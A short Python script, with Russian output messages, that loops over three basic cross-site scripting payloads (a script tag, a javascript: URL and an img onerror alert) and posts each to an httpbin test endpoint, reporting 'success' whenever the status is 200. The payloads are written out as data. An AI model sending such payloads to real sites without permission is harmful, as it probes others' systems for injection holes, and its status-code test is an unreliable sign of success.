import requests

url = "https://httpbin.org/post"

payloads_list = [
    "<script>alert()</script>",
    "javascript:alert()",
    "<img src=x onerror=alert(1)>"
]
for brutfors in payloads_list:

    form = {
        "payloads":brutfors
    }
    res = requests.post(url,json=form)

    if res.status_code == 200:
        print(f"отлично код на сайте {brutfors}")
    else:
        print(f"код не дошел {brutfors}")